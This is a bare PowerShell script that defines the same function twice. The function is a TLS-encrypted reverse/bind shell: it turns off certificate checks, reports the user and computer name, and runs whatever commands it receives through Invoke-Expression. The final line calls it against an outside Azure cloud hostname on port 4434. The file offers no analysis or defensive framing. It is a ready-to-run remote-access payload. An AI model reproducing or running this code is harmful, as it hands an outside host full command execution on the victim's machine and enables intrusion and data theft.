function reverse {
    [CmdletBinding(DefaultParameterSetName = "reverse")]
    param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName = "reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName = "bind")]
        [String] $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName = "reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName = "bind")]
        [Int] $Port,

        [Parameter(ParameterSetName = "reverse")] [Switch] $Reverse,
        [Parameter(ParameterSetName = "bind")] [Switch] $Bind
    )

    try {
        Add-Type -TypeDefinition @"
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;

public class Tls12Stream : SslStream {
    public Tls12Stream(NetworkStream stream) :
        base(stream, false, new RemoteCertificateValidationCallback((sender, cert, chain, errors) => true)) {}

    public void AuthenticateTls12(string targetHost) {
        this.AuthenticateAsClient(targetHost, null, SslProtocols.Tls12, false);
    }
}
"@

        $tcpC = if ($Reverse) {
            New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
        } elseif ($Bind) {
            $lstn3r = [System.Net.Sockets.TcpListener]::new($Port)
            $lstn3r.Start()
            $lstn3r.AcceptTcpClient()
        }

        $stream = $tcpC.GetStream()
        $ssl = [Tls12Stream]::new($stream)
        $ssl.AuthenticateTls12($IPAddress)

        [byte[]]$buffer = 0..65535 | ForEach-Object { 0 }
        $init = [System.Text.Encoding]::ASCII.GetBytes("Windows PowerShell running as $env:username on $env:computername`n`n")
        $ssl.Write($init, 0, $init.Length)

        while (($i = $ssl.Read($buffer, 0, $buffer.Length)) -ne 0) {
            $cmd = ([System.Text.Encoding]::ASCII).GetString($buffer, 0, $i).Trim()
            try {
                $output = Invoke-Expression -Command $cmd 2>&1 | Out-String
            } catch {
                $output = "Command failed: $_"
            }
            $prompt = "PS " + (Get-Location).Path + "> "
            $response = [System.Text.Encoding]::ASCII.GetBytes($output + $prompt)
            $ssl.Write($response, 0, $response.Length)
            $ssl.Flush()
        }

        $tcpC.Close()
        if ($lstn3r) { $lstn3r.Stop() }
    } catch {
        Write-Warning "Something went wrong! Check connectivity and TLS settings."
        Write-Error $_
    }
}
function reverse {
    [CmdletBinding(DefaultParameterSetName = "reverse")]
    param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName = "reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName = "bind")]
        [String] $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName = "reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName = "bind")]
        [Int] $Port,

        [Parameter(ParameterSetName = "reverse")] [Switch] $Reverse,
        [Parameter(ParameterSetName = "bind")] [Switch] $Bind
    )

    try {
        Add-Type -TypeDefinition @"
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;

public class Tls12Stream : SslStream {
    public Tls12Stream(NetworkStream stream) :
        base(stream, false, new RemoteCertificateValidationCallback((sender, cert, chain, errors) => true)) {}

    public void AuthenticateTls12(string targetHost) {
        this.AuthenticateAsClient(targetHost, null, SslProtocols.Tls12, false);
    }
}
"@

        $tcpC = if ($Reverse) {
            New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
        } elseif ($Bind) {
            $lstn3r = [System.Net.Sockets.TcpListener]::new($Port)
            $lstn3r.Start()
            $lstn3r.AcceptTcpClient()
        }

        $stream = $tcpC.GetStream()
        $ssl = [Tls12Stream]::new($stream)
        $ssl.AuthenticateTls12($IPAddress)

        [byte[]]$buffer = 0..65535 | ForEach-Object { 0 }
        $init = [System.Text.Encoding]::ASCII.GetBytes("Windows PowerShell running as $env:username on $env:computername`n`n")
        $ssl.Write($init, 0, $init.Length)

        while (($i = $ssl.Read($buffer, 0, $buffer.Length)) -ne 0) {
            $cmd = ([System.Text.Encoding]::ASCII).GetString($buffer, 0, $i).Trim()
            try {
                $output = Invoke-Expression -Command $cmd 2>&1 | Out-String
            } catch {
                $output = "Command failed: $_"
            }
            $prompt = "PS " + (Get-Location).Path + "> "
            $response = [System.Text.Encoding]::ASCII.GetBytes($output + $prompt)
            $ssl.Write($response, 0, $response.Length)
            $ssl.Flush()
        }

        $tcpC.Close()
        if ($lstn3r) { $lstn3r.Stop() }
    } catch {
        Write-Warning "Something went wrong! Check connectivity and TLS settings."
        Write-Error $_
    }
}
reverse -Reverse -IPAddress artinhere.israelcentral.cloudapp.azure.com -Port 4434
